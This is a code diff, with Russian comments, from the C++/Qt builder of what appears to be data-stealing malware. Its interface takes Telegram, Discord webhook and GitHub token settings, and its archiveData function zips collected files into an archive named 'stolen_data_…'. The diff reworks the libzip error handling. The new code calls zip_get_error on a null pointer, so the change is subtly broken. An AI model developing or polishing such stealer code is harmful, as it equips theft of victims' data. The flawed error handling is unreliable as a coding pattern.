@@ -200,7 +200,7 @@ MainWindow::MainWindow(QWidget *parent)
     tokenLineEdit = ui->tokenLineEdit;
     chatIdLineEdit = ui->chatIdLineEdit;
     discordWebhookLineEdit = ui->discordWebhookLineEdit;
-    fileNameLineEdit = ui->fileNameLineEdit
+    fileNameLineEdit = ui->fileNameLineEdit;
     iconPathLineEdit = ui->iconPathLineEdit;
     githubTokenLineEdit = ui->githubTokenLineEdit;
     githubRepoLineEdit = ui->githubRepoLineEdit;
@@ -1565,11 +1565,13 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 
     std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
     zip_error_t err;
-    zip_error_init(&err); // Явная инициализация для совместимости со старыми версиями libzip
+    zip_error_init(&err); // Инициализация структуры ошибки
 
-    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
+    // Открываем архив без третьего аргумента, ошибки будем получать через zip_get_error
+    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
     if (!zip) {
-        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(&err)));
+        zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку, если zip == nullptr
+        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString(zip_error_strerror(zipErr)));
         zip_error_fini(&err);
         return "";
     }
@@ -1583,14 +1585,14 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 
         zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, -1);
         if (!source) {
-            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " + 
+            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " +
                     QString(zip_error_strerror(zip_get_error(zip))));
             continue;
         }
 
         std::string fileName = std::filesystem::path(filePath).filename().string();
         if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
-            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName) + ": " + 
+            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName) + ": " +
                     QString(zip_error_strerror(zip_get_error(zip))));
             zip_source_free(source);
             continue;
@@ -1605,20 +1607,16 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
         return "";
     }
 
-    // Сохраняем ошибку перед закрытием
-    zip_error_t closeErr;
-    zip_error_init(&closeErr);
+    // Закрываем архив и проверяем ошибки
     if (zip_close(zip) < 0) {
         zip_error_t* zipErr = zip_get_error(zip); // Получаем ошибку до освобождения
-        zip_error_set(&closeErr, zip_error_code_zip(zipErr), zip_error_code_system(zipErr));
-        emitLog("Ошибка закрытия ZIP-архива: " + QString(zip_error_strerror(&closeErr)));
-        zip_discard(zip);
-        zip_error_fini(&closeErr);
+        emitLog("Ошибка закрытия ZIP-архива: " + QString(zip_error_strerror(zipErr)));
+        zip_discard(zip); // Используем discard, так как zip_close не удался
         zip_error_fini(&err);
         return "";
     }
 
-    zip_error_fini(&err); // Очистка основной структуры ошибки
+    zip_error_fini(&err); // Очистка структуры ошибки
     emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
     return zipPath;
 }
